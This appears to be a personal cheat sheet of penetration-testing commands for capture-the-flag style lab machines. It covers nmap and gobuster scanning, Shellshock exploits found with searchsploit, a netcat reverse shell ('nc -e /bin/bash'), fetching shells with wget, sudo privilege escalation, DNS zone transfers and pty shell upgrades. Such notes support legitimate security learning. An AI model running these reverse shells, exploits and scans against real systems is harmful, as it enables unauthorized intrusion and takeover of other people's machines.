# don-t-forget
For us to easily remember the things we forgot
netcad 
nc -nvlp port for listening ports wich is we wanna use that
next type id next ls or pwd
nc -e /bin/bash host ip and port when we enter system 
nmap:
nmap -sS -A -v -p --min-rate 99999 host 
nmap -p- -sV port scanning ant its version
nmap -sV -sC -v From your scans, what version is FTP running on the target?
nmap -sS -p- -Pn --min-rate host ip for            to find all open ports
nmap -sC -sV -p htb
 nmap --script vuln -A 10.129.123.49 for finding all vulnerablitie


when the site open u must use /robots.txt
/cgi-bin/
/cgi-bin/user.sh

gobuster:
gobuster dir -u http://host -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt -x .ph,.txt,.conf,.doc,.sh
gobuster  dir -u  http://10.129.123.49 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 50


nikto -h host

searcsploit (shell shock) -m
vim (payload extension)

if u have a payload for ex
python 34900.py rhost=ip(host) lhost=ip(host) payload=reverse(or bind)

we can compile exploit wirth gcc
gcc -o exploit 44298.c 
and ls 


python -m SimpleHTTPServer 80

chmod +x exploit for giving a permission(x using execute)

msfconsole
set rpath /cgi-bin/user.sh

sudo -l say to us u can run this commands

xkcd for explain vuln with nice comic


wget for upload shell

sudo -u scriptmanager /bib/bash this means u get a scriptmanager rank

next time ls -la shows to us permission  


dnszone using:
dig -t NS(name server)
dig axfr @nameserver nameserver

nslookup for finding nameserver

check the command injection

 python upgrade shell       python -c 'import pty; pty.spawn("/bin/bash")'
 
 ctrl u (for inspect source)
 
 ubuntu apache  2.2.22 precision for finding last ubuntu update
 and next gonna here  from mozilla: ubuntu release precise
